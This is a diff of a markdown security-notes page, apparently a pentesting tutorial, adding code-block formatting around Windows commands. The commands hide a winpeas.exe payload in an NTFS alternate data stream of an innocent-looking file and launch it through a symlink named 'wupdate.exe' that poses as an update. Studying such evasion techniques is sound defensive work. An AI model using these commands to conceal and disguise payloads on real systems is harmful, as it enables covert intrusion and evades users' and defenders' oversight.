@@ -16,6 +16,7 @@
 
 In Windows cmd prompt shell.
 
+{% code overflow="wrap" lineNumbers="true" %}
 ```powershell
 # we create a test.txt file in the cmd prompt shell
 # requires admin priv though.
@@ -34,6 +35,7 @@ notepad test.txt:secret.txt  # outputs the content of the secret file.
 type winpeas.exe > file.txt:winpeas.exe
 
 # an attacker will enter some data into the "file.txt" file, then it appears to have some sort of content in it.
+
 # Now we have to create a symboloc link to enable us start the payload file automatically.
 # mklink <randomLegitmateFIleName> <path_to_hiddenPayload_file>:<actual_payload_fileName>
 mklink wupdate.exe C:\Temp\file.txt:winpeas.exe
@@ -41,6 +43,7 @@ mklink wupdate.exe C:\Temp\file.txt:winpeas.exe
 # whenever we type "wupdate" it will run the "wineas.exe" file automatically.
 wupdate
 ```
+{% endcode %}
 
 
 
